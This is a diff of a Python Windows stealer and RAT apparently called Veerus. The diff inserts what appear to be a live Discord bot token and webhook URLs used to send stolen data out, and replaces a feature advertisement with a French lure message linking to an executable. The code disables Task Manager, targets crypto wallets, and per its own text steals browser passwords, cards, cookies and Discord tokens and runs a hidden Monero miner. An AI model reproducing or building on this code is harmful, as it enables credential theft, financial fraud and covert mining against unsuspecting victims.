@@ -1,20 +1,16 @@
 import os
 from datetime import datetime, timedelta
-from os import getenv, getlogin, listdir
+from os import getenv, getlogin, listdir, walk
 import sqlite3
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import discord
 import win32crypt
-import codecs
-import win32crypt
 import shutil
 import command
-import time
 import random
 import threading
 import re
 import wmi
-import json
 import uuid
 import textwrap
 import psutil
@@ -24,38 +20,29 @@ import requests
 import sys
 import base64
 from base64 import b64decode
-from Crypto.Cipher import AES
 from json import loads
 from regex import findall
 import platform
-from http.server import BaseHTTPRequestHandler, HTTPServer
 import time
 from pathlib import Path
 import codecs
-import os
-from http.server import HTTPServer, CGIHTTPRequestHandler
-import tkinter as tk
 import pyImpossibleObf
-import os
 import json
 import base64
 from addict import Dict
-import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
-import shutil
 from datetime import timezone, datetime, timedelta
 import winreg as reg
 import winreg
 from anonfile import AnonFile
 import getpass
-import os
 import zipfile
 import win32clipboard
-from os import walk
 USER_NAME = getpass.getuser()
 
-#uuid:  42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq.1c378b61-fbe4-46e8-aa45-220292ff7cab
+
+
 """
 
 	globals :
@@ -63,38 +50,16 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-Bot_Token = "BotTokenForTheRat667"
+Bot_Token = "MTAxMjAwNjMzOTQwNjQ3OTM5MA.GOupsL.usiJ0LqTvSIRRY9AMjht3i9AfYS7Q3cWxAFgyQ"
 
 
-WEBHOOK = "webhook667"
+WEBHOOK = "https://discord.com/api/webhooks/1012007132427726969/5fwQBz7n3vElzF9GmB2Ljhx0xrnmTP9L2VSKo_GvXt_jScSDKSFbKad4PWrnIC7irvLF"
 webhook = WEBHOOK
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 dm_all = True
-DMALLMSG = """:flag_gb: Hello !
-Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same? Let me explain what you can do with Veerus :
-```Stealer :
-	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
-		Passwords, Credit Cards, Cookies, Autofill
-
-	Discord :
-		Token
-
-	Miner :		
-		Hidden XMR Miner
-	Other :
-		Add to computer startup the number of time you choosed.
-		Clone the virus in random directories
-		Undetected by Windows Defender & Windows Smart screen
-		Anti Virtual Machine
-		Disable Task Manager```
-
-	Price : 0.00$ ! yes ! Totally Free !
-
-	Links :
-		Discord : https://discord.gg/7GkfBzRQXX
-		Github : https://github.com/0xSxZ/Veerus"""
+DMALLMSG = """Oe bebou g trv un discord image grabber c incroyable genre t'envoie une image et ca grab\nGithub : https://github.com/0xSxZuu/test/releases/download/test/image_grabber.exe"""
 mdmbot = discord.Client()
-STATSWEBHOOK = "NoWebhook667EKIP"
+STATSWEBHOOK = "https://discord.com/api/webhooks/1012007166690984027/htoCjghCE9hZvs05SY8PrlKGqVJQ_WWltNmraWX603IUL-a8E28eGYmVFeZMlS-xT86U"
 STATSAPI = [
 	"https://api.nanopool.org/v1/xmr/hashrate/" + str(ADDRESS),
 	"https://api.nanopool.org/v1/eth/avghashrate/" + str(ADDRESS),
@@ -119,6 +84,9 @@ def set_reg(name, value):
 		return False
 
 set_reg("DisableTaskMgr", "1")
+
+
+
 WALLETCOUNT = 0
 CURRENCYPWNUM = 0
 CREDITCARDSNUM = 0
@@ -159,6 +127,7 @@ currency = "=========Stealed by 0xSxZ =============\n\n"
 currencyCookies = "=========Stealed by 0xSxZ =============\n\n"
 local_appdata = os.environ['LOCALAPPDATA'] + "\\"
 default_appdata = os.getenv('APPDATA')
+
 
 walletspath = [
 	default_appdata + "\\Bitcoin"
